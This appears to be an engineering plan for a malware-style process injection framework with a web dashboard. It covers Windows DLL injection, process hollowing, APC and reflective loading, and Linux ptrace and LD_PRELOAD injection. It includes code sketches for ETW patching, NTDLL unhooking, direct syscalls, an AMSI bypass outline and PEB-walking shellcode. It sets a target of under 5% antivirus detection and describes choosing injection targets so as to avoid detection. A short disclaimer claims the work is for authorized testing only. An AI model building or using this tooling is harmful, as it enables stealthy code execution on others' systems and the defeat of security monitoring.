# PHASE 2: PROCESS INJECTION & HOLLOWING - MASTER ENGINEERING PLAN

## Core Principles (Same as Phase 1)
1. **No shortcuts** - Every technique fully implemented
2. **Real testing** - Everything verified to actually work
3. **Advanced coding** - Not surface level, truly sophisticated
4. **Complete integration** - Frontend to backend, all wired
5. **Deep validation** - Test from user perspective

## Phase 2 Architecture Overview

```
┌─────────────────────────────────────────────┐
│            Web Dashboard                     │
│  ┌────────────────────────────────────┐     │
│  │   Process Injection Interface      │     │
│  │  - Target Process Selector         │     │
│  │  - Injection Method Dropdown       │     │
│  │  - Payload Selection              │     │
│  │  - Execute & Monitor              │     │
│  └────────────────────────────────────┘     │
└─────────────────────┬───────────────────────┘
                      │
        ┌─────────────▼──────────────┐
        │     Injection Engine        │
        │   /native_payloads/inject/  │
        └─────────────┬───────────────┘
                      │
    ┌─────────────────┴─────────────────┐
    │                                   │
┌───▼──────────┐            ┌──────────▼────────┐
│   Windows    │            │      Linux        │
│  Techniques  │            │    Techniques     │
├──────────────┤            ├───────────────────┤
│ • Classic DLL│            │ • ptrace inject   │
│ • Hollowing  │            │ • LD_PRELOAD      │
│ • APC Queue  │            │ • /proc/mem       │
│ • Manual Map │            │ • .so injection   │
│ • Reflective │            │ • VDSO hijack     │
└──────────────┘            └───────────────────┘
```

## Detailed Implementation Plan

### STAGE 1: Core Injection Framework (Week 1)

#### 1.1 Create Injection Module Structure
```
/workspace/native_payloads/inject/
├── inject_core.h          # Common interfaces
├── inject_core.c          # Shared injection logic
├── inject_windows.h       # Windows-specific
├── inject_windows.c       # Windows implementations
├── inject_linux.h         # Linux-specific
├── inject_linux.c         # Linux implementations
├── inject_stealth.h       # Evasion techniques
├── inject_stealth.c       # Anti-detection
├── inject_payloads.h      # Payload templates
└── inject_payloads.c      # Shellcode generation
```

#### 1.2 Core Interfaces
```c
// inject_core.h
typedef enum {
    INJECT_SUCCESS = 0,
    INJECT_PROCESS_NOT_FOUND,
    INJECT_ACCESS_DENIED,
    INJECT_ALLOCATION_FAILED,
    INJECT_WRITE_FAILED,
    INJECT_EXECUTION_FAILED,
    INJECT_TECHNIQUE_UNSUPPORTED
} inject_status_t;

typedef enum {
    // Windows techniques
    INJECT_CREATEREMOTETHREAD,
    INJECT_SETWINDOWSHOOK,
    INJECT_QUEUEUSERAPC,
    INJECT_SETTHREADCONTEXT,
    INJECT_PROCESS_HOLLOWING,
    INJECT_MANUAL_MAP,
    INJECT_REFLECTIVE_DLL,
    
    // Linux techniques
    INJECT_PTRACE,
    INJECT_LD_PRELOAD,
    INJECT_PROC_MEM,
    INJECT_DLOPEN,
    INJECT_VDSO_HIJACK
} inject_technique_t;

typedef struct {
    uint32_t pid;
    char process_name[256];
    inject_technique_t technique;
    uint8_t* payload;
    size_t payload_size;
    uint32_t flags;  // STEALTH, PERSIST, etc
} inject_config_t;
```

### STAGE 2: Windows Injection Techniques (Week 1-2)

#### 2.1 Classic DLL Injection (CreateRemoteThread)
- **Real Implementation**: Not just LoadLibrary, but with obfuscation
- **Features**:
  - Process handle acquisition with SeDebugPrivilege
  - VirtualAllocEx with randomized allocation address
  - WriteProcessMemory with chunked writes
  - CreateRemoteThread with spoofed start address
  - Cleanup and trace removal

#### 2.2 Process Hollowing (Advanced)
- **Real Implementation**: Full PE unmapping and replacement
- **Steps**:
  1. Create suspended process
  2. NtUnmapViewOfSection to hollow
  3. Allocate new memory at ImageBase
  4. Write headers and sections
  5. Relocate if needed
  6. Set thread context (RCX for entry)
  7. Resume thread
  8. Parent process spoofing

#### 2.3 APC Queue Injection
- **Real Implementation**: Multi-threaded APC injection
- **Features**:
  - Enumerate all threads
  - Check alertable state
  - Queue both user and kernel APCs
  - NtQueueApcThread for stealth
  - Early bird APC variant

#### 2.4 Manual Mapping
- **Real Implementation**: Full PE loader in target
- **Components**:
  - Custom GetProcAddress
  - Import resolution
  - Relocation processing
  - TLS callbacks
  - Exception handlers
  - No PE headers in memory

#### 2.5 Reflective DLL
- **Real Implementation**: Self-loading DLL
- **Features**:
  - ReflectiveLoader export
  - PEB walking for kernel32
  - Runtime API resolution
  - Self-relocation
  - Shellcode bootstrap

### STAGE 3: Linux Injection Techniques (Week 2)

#### 3.1 ptrace() Injection
- **Real Implementation**: Full ptrace-based injection
```c
int inject_ptrace_linux(pid_t pid, void* payload, size_t size) {
    // Attach to process
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    
    // Get registers
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    
    // Backup original code
    // Inject shellcode
    // Set RIP to shellcode
    // Restore on completion
}
```

#### 3.2 LD_PRELOAD Hijacking
- **Real Implementation**: Runtime library injection
- **Features**:
  - Modify environment
  - Hook functions
  - Persist across execve

#### 3.3 /proc/[pid]/mem Injection
- **Real Implementation**: Direct memory writing
- **Features**:
  - Parse /proc/[pid]/maps
  - Find executable regions
  - Write shellcode
  - Trigger via signals

#### 3.4 .so Injection via dlopen()
- **Real Implementation**: Force library loading
- **Steps**:
  - Find dlopen in target
  - Setup stack for call
  - Redirect execution
  - Load malicious .so

### STAGE 4: Advanced Evasion (Week 2-3)

#### 4.1 Direct Syscalls
```c
// Bypass userland hooks entirely
NTSTATUS NtAllocateVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    // Direct syscall via assembly
    __asm__ (
        "mov r10, rcx\n"
        "mov eax, 0x18\n"  // NtAllocateVirtualMemory
        "syscall\n"
    );
}
```

#### 4.2 NTDLL Unhooking
- **Real Implementation**: Remove all hooks
```c
void unhook_ntdll() {
    // Map fresh NTDLL from disk
    HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
    HANDLE mapping = CreateFileMappingA(file, ...);
    LPVOID clean_ntdll = MapViewOfFile(mapping, ...);
    
    // Get current NTDLL
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    
    // Find .text section
    PIMAGE_NT_HEADERS nt = ...;
    
    // Overwrite with clean bytes
    VirtualProtect(...);
    memcpy(hooked_text, clean_text, text_size);
}
```

#### 4.3 ETW Bypass
```c
void bypass_etw() {
    // Patch EtwEventWrite to return immediately
    void* etw_func = GetProcAddress(
        GetModuleHandleA("ntdll.dll"), 
        "EtwEventWrite"
    );
    
    BYTE patch[] = { 0xC3 };  // ret
    VirtualProtect(etw_func, 1, PAGE_EXECUTE_READWRITE, &old);
    memcpy(etw_func, patch, 1);
}
```

#### 4.4 AMSI Bypass
```c
void bypass_amsi() {
    // Multiple techniques
    // 1. Patch AmsiScanBuffer
    // 2. Corrupt amsi.dll
    // 3. Registry manipulation
}
```

### STAGE 5: Process Discovery & Analysis (Week 3)

#### 5.1 Advanced Process Enumeration
```c
typedef struct {
    DWORD pid;
    DWORD ppid;
    char name[256];
    char path[512];
    BOOL is_64bit;
    BOOL is_protected;
    BOOL is_suspended;
    DWORD session_id;
    char user[256];
    HANDLE token;
} process_info_t;

process_info_t* enumerate_processes() {
    // Use multiple methods:
    // - CreateToolhelp32Snapshot
    // - NtQuerySystemInformation
    // - WMI queries
    // - Handle enumeration
}
```

#### 5.2 Target Selection Intelligence
```c
typedef struct {
    BOOL is_browser;
    BOOL is_system;
    BOOL is_security_product;
    BOOL has_debug_port;
    BOOL is_critical;
    int injection_score;  // 0-100
} process_analysis_t;

process_analysis_t analyze_target(DWORD pid) {
    // Smart targeting to avoid detection
}
```

### STAGE 6: Shellcode & Payload Management (Week 3)

#### 6.1 Position-Independent Shellcode
```asm
; Universal loader shellcode
[BITS 64]
start:
    ; Get current position
    call get_rip
get_rip:
    pop rax
    
    ; Resolve kernel32.dll
    mov rax, [gs:0x60]  ; PEB
    mov rax, [rax+0x18] ; PEB_LDR_DATA
    mov rax, [rax+0x20] ; InMemoryOrderModuleList
    mov rax, [rax]      ; 2nd entry = kernel32
    mov rbx, [rax+0x20] ; DllBase
    
    ; Find GetProcAddress
    ; ... PE parsing ...
    
    ; Load main payload
    ; ...
```

#### 6.2 Encrypted Payload Storage
```c
typedef struct {
    uint8_t key[32];
    uint8_t iv[16];
    uint32_t original_size;
    uint32_t encrypted_size;
    uint8_t* encrypted_data;
} encrypted_payload_t;

void encrypt_payload(payload_t* payload) {
    // AES-256-GCM encryption
    // Anti-debugging checks
    // Integrity verification
}
```

### STAGE 7: Web Integration (Week 4)

#### 7.1 Backend API Endpoints
```python
@app.route('/api/inject/list-processes', methods=['GET'])
@login_required
def list_processes():
    """List all running processes with injection viability scores"""
    
@app.route('/api/inject/execute', methods=['POST'])
@login_required
def execute_injection():
    """Perform injection with specified technique"""
    data = request.json
    # {
    #   "target_pid": 1234,
    #   "technique": "hollowing",
    #   "payload": "base64_encoded",
    #   "options": {...}
    # }
```

#### 7.2 Frontend UI Components
```javascript
// Process selector with live filtering
class ProcessSelector {
    constructor() {
        this.processes = [];
        this.selectedPid = null;
        this.filters = {
            hideSystem: true,
            hideCritical: true,
            showOnlyInjectable: false
        };
    }
    
    async loadProcesses() {
        const response = await fetch('/api/inject/list-processes');
        this.processes = await response.json();
        this.render();
    }
    
    render() {
        // Beautiful table with:
        // - Process icon
        // - Name, PID, User
        // - Injection score (color-coded)
        // - Architecture (x86/x64)
        // - Protection status
    }
}

// Injection control panel
class InjectionController {
    constructor() {
        this.techniques = {
            'windows': [
                {id: 'dll', name: 'Classic DLL Injection', risk: 'Medium'},
                {id: 'hollow', name: 'Process Hollowing', risk: 'Low'},
                {id: 'apc', name: 'APC Queue', risk: 'Low'},
                {id: 'manual', name: 'Manual Mapping', risk: 'Very Low'},
                {id: 'reflective', name: 'Reflective DLL', risk: 'Very Low'}
            ],
            'linux': [
                {id: 'ptrace', name: 'ptrace() Injection', risk: 'Medium'},
                {id: 'ld_preload', name: 'LD_PRELOAD', risk: 'High'},
                {id: 'proc_mem', name: '/proc/mem Write', risk: 'Low'},
                {id: 'so', name: '.so Injection', risk: 'Medium'}
            ]
        };
    }
    
    async inject() {
        // Show progress
        // Handle errors
        // Display results
    }
}
```

### STAGE 8: Testing Infrastructure (Week 4)

#### 8.1 Automated Testing Suite
```python
# test_injection.py
class InjectionTestSuite:
    def __init__(self):
        self.test_processes = []
        self.results = {}
        
    def setup_test_targets(self):
        """Spawn various test processes"""
        # - notepad.exe (simple)
        # - chrome.exe (complex)
        # - svchost.exe (protected)
        
    def test_all_techniques(self):
        """Test each injection method"""
        for technique in TECHNIQUES:
            for process in self.test_processes:
                result = self.test_injection(technique, process)
                self.log_result(result)
                
    def test_detection(self):
        """Check if we're detected by AV/EDR"""
        # - Windows Defender
        # - AMSI
        # - ETW
        # - Sysmon
```

#### 8.2 Performance Metrics
```c
typedef struct {
    uint64_t injection_time_ms;
    uint64_t memory_usage;
    uint32_t handles_created;
    uint32_t threads_created;
    BOOL detected_by_av;
    BOOL process_crashed;
    float success_rate;
} injection_metrics_t;
```

### STAGE 9: Documentation & Validation (Week 4)

#### 9.1 Complete Documentation
- API documentation
- Technique explanations
- Security considerations
- Usage examples
- Troubleshooting guide

#### 9.2 Validation Checklist
```python
# phase2_validator.py
class Phase2Validator:
    def validate(self):
        checks = [
            self.check_all_techniques_implemented(),
            self.check_windows_injection_works(),
            self.check_linux_injection_works(),
            self.check_evasion_techniques(),
            self.check_web_integration(),
            self.check_ui_components(),
            self.check_error_handling(),
            self.check_cleanup_code(),
            self.check_documentation(),
            self.check_test_coverage()
        ]
        return all(checks)
```

## Implementation Timeline

### Week 1: Foundation
- [ ] Day 1-2: Create injection module structure
- [ ] Day 3-4: Implement CreateRemoteThread injection
- [ ] Day 5-7: Implement Process Hollowing

### Week 2: Core Techniques
- [ ] Day 1-2: APC Queue injection
- [ ] Day 3-4: Manual Mapping
- [ ] Day 5-6: Linux ptrace injection
- [ ] Day 7: Linux LD_PRELOAD

### Week 3: Advanced Features
- [ ] Day 1-2: Direct syscalls implementation
- [ ] Day 3-4: NTDLL unhooking & ETW bypass
- [ ] Day 5-6: Process enumeration & analysis
- [ ] Day 7: Shellcode templates

### Week 4: Integration & Testing
- [ ] Day 1-2: Web API integration
- [ ] Day 3-4: Frontend UI implementation
- [ ] Day 5-6: Complete testing suite
- [ ] Day 7: Final validation & documentation

## Success Criteria

### Must Have (100% Required)
- ✅ All 5 Windows techniques working
- ✅ All 4 Linux techniques working
- ✅ Direct syscalls implemented
- ✅ NTDLL unhooking working
- ✅ Process enumeration with details
- ✅ Web UI fully integrated
- ✅ Error handling robust
- ✅ Clean compilation
- ✅ Test suite passing
- ✅ Documentation complete

### Performance Targets
- Injection time: < 100ms
- Success rate: > 95%
- Detection rate: < 5% (by Windows Defender)
- Memory overhead: < 10MB
- No process crashes

### Security Requirements
- No memory leaks
- Proper handle cleanup
- Encrypted payloads
- Obfuscated strings
- Anti-debugging active

## Development Rules (Same as Phase 1)

1. **NO SHORTCUTS** - Every technique fully implemented
2. **REAL TESTING** - Test on actual processes, not just demos
3. **ADVANCED CODING** - Use direct syscalls, not just WinAPI
4. **COMPLETE INTEGRATION** - Every feature accessible from UI
5. **DEEP VALIDATION** - Test as a real attacker would

## Risk Mitigation

### Technical Risks
- **Process crashes**: Implement careful checks
- **Detection**: Use multiple evasion layers
- **Compatibility**: Test on multiple OS versions

### Development Risks
- **Complexity**: Break into small, testable units
- **Testing**: Use VMs, never production systems
- **Time**: Prioritize core features first

## Note on Ethics & Legal

⚠️ **CRITICAL**: This is for authorized security testing only
- Only test on systems you own
- Never use on production systems without permission
- Include killswitch in all payloads
- Log all activities for audit

## Ready to Start

With this comprehensive plan, we will:
1. Implement every injection technique properly
2. Test everything thoroughly
3. Integrate fully with the web UI
4. Validate to the same standard as Phase 1

Let's begin implementation!